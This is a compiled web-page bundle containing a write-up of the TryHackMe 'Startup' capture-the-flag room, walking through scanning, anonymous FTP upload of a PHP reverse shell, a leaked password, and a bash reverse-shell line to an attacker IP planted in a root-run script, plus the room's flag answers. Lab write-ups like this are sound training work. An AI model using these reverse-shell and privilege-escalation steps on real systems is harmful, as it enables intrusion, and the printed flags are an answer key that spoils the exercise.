"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[9158],{3905:(t,e,n)=>{n.d(e,{Zo:()=>c,kt:()=>h});var r=n(67294);function o(t,e,n){return e in t?Object.defineProperty(t,e,{value:n,enumerable:!0,configurable:!0,writable:!0}):t[e]=n,t}function a(t,e){var n=Object.keys(t);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(t);e&&(r=r.filter((function(e){return Object.getOwnPropertyDescriptor(t,e).enumerable}))),n.push.apply(n,r)}return n}function s(t){for(var e=1;e<arguments.length;e++){var n=null!=arguments[e]?arguments[e]:{};e%2?a(Object(n),!0).forEach((function(e){o(t,e,n[e])})):Object.getOwnPropertyDescriptors?Object.defineProperties(t,Object.getOwnPropertyDescriptors(n)):a(Object(n)).forEach((function(e){Object.defineProperty(t,e,Object.getOwnPropertyDescriptor(n,e))}))}return t}function i(t,e){if(null==t)return{};var n,r,o=function(t,e){if(null==t)return{};var n,r,o={},a=Object.keys(t);for(r=0;r<a.length;r++)n=a[r],e.indexOf(n)>=0||(o[n]=t[n]);return o}(t,e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(t);for(r=0;r<a.length;r++)n=a[r],e.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(t,n)&&(o[n]=t[n])}return o}var p=r.createContext({}),l=function(t){var e=r.useContext(p),n=e;return t&&(n="function"==typeof t?t(e):s(s({},e),t)),n},c=function(t){var e=l(t.components);return r.createElement(p.Provider,{value:e},t.children)},u="mdxType",d={inlineCode:"code",wrapper:function(t){var e=t.children;return r.createElement(r.Fragment,{},e)}},m=r.forwardRef((function(t,e){var n=t.components,o=t.mdxType,a=t.originalType,p=t.parentName,c=i(t,["components","mdxType","originalType","parentName"]),u=l(n),m=o,h=u["".concat(p,".").concat(m)]||u[m]||d[m]||a;return n?r.createElement(h,s(s({ref:e},c),{},{components:n})):r.createElement(h,s({ref:e},c))}));function h(t,e){var n=arguments,o=e&&e.mdxType;if("string"==typeof t||o){var a=n.length,s=new Array(a);s[0]=m;var i={};for(var p in e)hasOwnProperty.call(e,p)&&(i[p]=e[p]);i.originalType=t,i[u]="string"==typeof t?t:o,s[1]=i;for(var l=2;l<a;l++)s[l]=n[l];return r.createElement.apply(null,s)}return r.createElement.apply(null,n)}m.displayName="MDXCreateElement"},82849:(t,e,n)=>{n.r(e),n.d(e,{assets:()=>p,contentTitle:()=>s,default:()=>d,frontMatter:()=>a,metadata:()=>i,toc:()=>l});var r=n(87462),o=(n(67294),n(3905));const a={},s="Startup",i={unversionedId:"Tryhackme/Startup/Startup",id:"Tryhackme/Startup/Startup",title:"Startup",description:"Abuse traditional vulnerabilities via untraditional means.",source:"@site/writeups/Tryhackme/Startup/Startup.md",sourceDirName:"Tryhackme/Startup",slug:"/Tryhackme/Startup/",permalink:"/writeups/Tryhackme/Startup/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Starting Out In Cyber Sec",permalink:"/writeups/Tryhackme/Starting Out In Cyber Sec/"},next:{title:"Steel Mountain",permalink:"/writeups/Tryhackme/Steel Mountain/"}},p={},l=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Welcome to Spice Hut!",id:"task-1-welcome-to-spice-hut",level:2},{value:"Task 2 Credits",id:"task-2-credits",level:2}],c={toc:l},u="wrapper";function d(t){let{components:e,...n}=t;return(0,o.kt)(u,(0,r.Z)({},c,n,{components:e,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"startup"},"Startup"),(0,o.kt)("p",null,"Abuse traditional vulnerabilities via untraditional means."),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/startup"},"Startup")),(0,o.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,o.kt)("li",{parentName:"ul"},"Web Enumeration"),(0,o.kt)("li",{parentName:"ul"},"FTP Enumeration"),(0,o.kt)("li",{parentName:"ul"},"FTP Exploitation"),(0,o.kt)("li",{parentName:"ul"},"Network Forensic"),(0,o.kt)("li",{parentName:"ul"},"Crontab Manipulation")),(0,o.kt)("hr",null),(0,o.kt)("h2",{id:"task-1-welcome-to-spice-hut"},"Task 1 Welcome to Spice Hut!"),(0,o.kt)("p",null,"We are Spice Hut, a new startup company that just made it big! We offer a variety of spices and club sandwiches (incase you get hungry), but that is not why you are here. To be truthful, we aren't sure if our developers know what they are doing and our security concerns are rising. We ask that you preform a thorough penetration test and try to own root. Good luck!"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Startup$ sudo nmap -A -sS -sC -sV -O 10.10.36.184\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-11-13 13:27 CET\nNmap scan report for 10.10.36.184\nHost is up (0.032s latency).\nNot shown: 997 closed ports\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.3\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n| drwxrwxrwx    2 65534    65534        4096 Nov 12 04:53 ftp [NSE: writeable]\n| -rw-r--r--    1 0        0          251631 Nov 12 04:02 important.jpg\n|_-rw-r--r--    1 0        0             208 Nov 12 04:53 notice.txt\n| ftp-syst:\n|   STAT:\n| FTP server status:\n|      Connected to 10.8.106.222\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 1\n|      vsFTPd 3.0.3 - secure, fast, stable\n|_End of status\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)\n|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)\n|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Maintenance\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=11/13%OT=21%CT=1%CU=37615%PV=Y%DS=2%DC=T%G=Y%TM=5FAE7B\nOS:C3%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=8)OP\nOS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST\nOS:11NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)EC\nOS:N(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=\nOS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(\nOS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%\nOS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N\nOS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C\nOS:D=S)\n\nNetwork Distance: 2 hops\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 443/tcp)\nHOP RTT      ADDRESS\n1   30.28 ms 10.8.0.1\n2   37.46 ms 10.10.36.184\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 24.93 seconds\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Startup$ gobuster dir -u http://10.10.36.184/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.36.184/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Timeout:        10s\n===============================================================\n2020/11/13 13:34:12 Starting gobuster\n===============================================================\n/files (Status: 301)\nProgress: 20964 / 220561 (9.50%)^C\n[!] Keyboard interrupt detected, terminating.\n===============================================================\n2020/11/13 13:35:22 Finished\n===============================================================\n")),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"http://10.10.36.184/files/"},"http://10.10.36.184/files/")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Startup$ ftp 10.10.36.184\nConnected to 10.10.36.184.\n220 (vsFTPd 3.0.3)\nName (10.10.36.184:kali): anonymous\n331 Please specify the password.\nPassword:\n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> ls -la\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\ndrwxr-xr-x    3 65534    65534        4096 Nov 12 04:53 .\ndrwxr-xr-x    3 65534    65534        4096 Nov 12 04:53 ..\n-rw-r--r--    1 0        0               5 Nov 12 04:53 .test.log\ndrwxrwxrwx    2 65534    65534        4096 Nov 12 04:53 ftp\n-rw-r--r--    1 0        0          251631 Nov 12 04:02 important.jpg\n-rw-r--r--    1 0        0             208 Nov 12 04:53 notice.txt\n226 Directory send OK.\nftp> mget *\nmget ftp?\n200 PORT command successful. Consider using PASV.\n550 Failed to open file.\nmget important.jpg?\n200 PORT command successful. Consider using PASV.\n150 Opening BINARY mode data connection for important.jpg (251631 bytes).\n226 Transfer complete.\n251631 bytes received in 0.59 secs (417.2951 kB/s)\nmget notice.txt?\n200 PORT command successful. Consider using PASV.\n150 Opening BINARY mode data connection for notice.txt (208 bytes).\n226 Transfer complete.\n208 bytes received in 0.00 secs (140.4737 kB/s)\nftp> cd ftp\n250 Directory successfully changed.\nftp> ls -la\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\ndrwxrwxrwx    2 65534    65534        4096 Nov 12 04:53 .\ndrwxr-xr-x    3 65534    65534        4096 Nov 12 04:53 ..\n226 Directory send OK.\nftp>\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"but Maya is looking pretty sus.")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Startup$ ftp 10.10.36.184\nConnected to 10.10.36.184.\n220 (vsFTPd 3.0.3)\nName (10.10.36.184:kali): anonymous\n331 Please specify the password.\nPassword:\n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> put php-reverse-shell.php\nlocal: php-reverse-shell.php remote: php-reverse-shell.php\n200 PORT command successful. Consider using PASV.\n553 Could not create file.\nftp> ls -la\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\ndrwxr-xr-x    3 65534    65534        4096 Nov 12 04:53 .\ndrwxr-xr-x    3 65534    65534        4096 Nov 12 04:53 ..\n-rw-r--r--    1 0        0               5 Nov 12 04:53 .test.log\ndrwxrwxrwx    2 65534    65534        4096 Nov 12 04:53 ftp\n-rw-r--r--    1 0        0          251631 Nov 12 04:02 important.jpg\n-rw-r--r--    1 0        0             208 Nov 12 04:53 notice.txt\n226 Directory send OK.\nftp> cd ftp\n250 Directory successfully changed.\nftp> put php-reverse-shell.php\nlocal: php-reverse-shell.php remote: php-reverse-shell.php\n200 PORT command successful. Consider using PASV.\n150 Ok to send data.\n226 Transfer complete.\n5494 bytes sent in 0.00 secs (67.1729 MB/s)\nftp> exit\n221 Goodbye.\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"www-data@startup:/$ cat recipe.txt\nSomeone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ scp suspicious.pcapng kali@10.8.106.222:/home/kali/CTFs/tryhackme/Startup\nCould not create directory '/var/www/.ssh'.\nThe authenticity of host '10.8.106.222 (10.8.106.222)' can't be established.\nECDSA key fingerprint is SHA256:xCE0Cpa4vJaXG1mwn7ciMO55E0R11HvAmXVl2ymdG+Y.\nAre you sure you want to continue connecting (yes/no)? yes\nFailed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).\nkali@10.8.106.222's password:\nsuspicious.pcapng                             100%   30KB  30.5KB/s   00:00\nwww-data@startup:/incidents$\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"www-data@startup:/$ cd\ncd\nbash: cd: HOME not set\nwww-data@startup:/$ ls\nls\nbin   etc     initrd.img.old  media  recipe.txt  snap  usr      vmlinuz.old\nboot  home    lib         mnt    root        srv   vagrant\ndata  incidents   lib64       opt    run         sys   var\ndev   initrd.img  lost+found      proc   sbin        tmp   vmlinuz\nwww-data@startup:/$ cd home\ncd home\nwww-data@startup:/home$ cd lennie\ncd lennie\nbash: cd: lennie: Permission denied\nwww-data@startup:/home$ ls\nls\nlennie\nwww-data@startup:/home$ cd lennie\ncd lennie\nbash: cd: lennie: Permission denied\nwww-data@startup:/home$ sudo -l\nsudo -l\n[sudo] password for www-data: c4ntg3t3n0ughsp1c3\n\nSorry, try again.\n[sudo] password for www-data:\n\nSorry, try again.\n[sudo] password for www-data: c4ntg3t3n0ughsp1c3\n\nsudo: 3 incorrect password attempts\nwww-data@startup:/home$ cat /etc/passwd\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"lennie@startup:~$ ls -lA\ntotal 12\ndrwxr-xr-x 2 lennie lennie 4096 Nov 12 04:53 Documents\ndrwxr-xr-x 2 root   root   4096 Nov 12 04:54 scripts\n-rw-r--r-- 1 lennie lennie   38 Nov 12 04:53 user.txt\nlennie@startup:~$ cat user.txt\nTHM{03ce3d619b80ccbfb3b7fc81e46c0e79}\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"lennie@startup:~$ ls -lA scripts/\ntotal 8\n-rwxr-xr-x 1 root root 77 Nov 12 04:53 planner.sh\n-rw-r--r-- 1 root root  1 Nov 13 12:55 startup_list.txt\nlennie@startup:~$ cat scripts/startup_list.txt\n\nlennie@startup:~$ cat scripts/planner.sh\n#!/bin/bash\necho $LIST > /home/lennie/scripts/startup_list.txt\n/etc/print.sh\nlennie@startup:~$ echo $LIST\n\nlennie@startup:~$\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"#!/bin/bash\n/bin/bash -c 'bash -i >& /dev/tcp/10.8.106.222/9002 0>&1'\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Startup$ nc -lnvp 9002\nListening on 0.0.0.0 9002\nConnection received on 10.10.36.184 36364\nbash: cannot set terminal process group (1690): Inappropriate ioctl for device\nbash: no job control in this shell\nroot@startup:~# ls -lA\nls -lA\ntotal 20\n-rw-r--r-- 1 root root 3106 Oct 22  2015 .bashrc\ndrwxr-xr-x 2 root root 4096 Nov 12 04:54 .nano\n-rw-r--r-- 1 root root  148 Aug 17  2015 .profile\n-rw-r--r-- 1 root root   38 Nov 12 04:53 root.txt\ndrwx------ 2 root root 4096 Nov 12 04:50 .ssh\nroot@startup:~# cat root.txt\ncat root.txt\nTHM{f963aaa6a430f210222158ae15c3d76d}\n")),(0,o.kt)("p",null,"What is the secret spicy soup recipe?"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"love")),(0,o.kt)("p",null,"What are the contents of user.txt?"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"THM{03ce3d619b80ccbfb3b7fc81e46c0e79}")),(0,o.kt)("p",null,"What are the contents of root.txt?"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"THM{f963aaa6a430f210222158ae15c3d76d}")),(0,o.kt)("h2",{id:"task-2-credits"},"Task 2 Credits"),(0,o.kt)("p",null,"Spice Hut was very happy with your results and it is guaranteed they will spread word about your excellence with their partners. Astounding work!"),(0,o.kt)("p",null,"I'd like to thank my ",(0,o.kt)("a",{parentName:"p",href:"https://elbee.xyz/"},"coffee")," as this took me hours to make, being that it is the first time I have done something like this."),(0,o.kt)("p",null,"I'd like to thank ",(0,o.kt)("a",{parentName:"p",href:"https://tryhackme.com/p/ku5e"},"ku5e")," for being a good sensei and ",(0,o.kt)("a",{parentName:"p",href:"https://tryhackme.com/p/GeneralClaw"},"GeneralClaw"),", my grammar cop."),(0,o.kt)("p",null,"I'd like to thank my testers ",(0,o.kt)("a",{parentName:"p",href:"https://tryhackme.com/p/Amit25095"},"Amit25095"),", ",(0,o.kt)("a",{parentName:"p",href:"https://tryhackme.com/p/Krypt0c"},"Krypt0c"),", ",(0,o.kt)("a",{parentName:"p",href:"https://tryhackme.com/p/BarZigmon"},"BarZigmon")," and ",(0,o.kt)("a",{parentName:"p",href:"https://tryhackme.com/p/powershot"},"powershot"),"."),(0,o.kt)("p",null,"Additionally, I'd love to thank TryHackMe not just for their platform, of which has changed my life, but for giving me this opportunity to give back to the community."),(0,o.kt)("p",null,"And of course, I'd like to thank you for playing. Hope to see you soon!"),(0,o.kt)("p",null,"Congratulations!"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"No answer needed")))}d.isMDXComponent=!0}}]);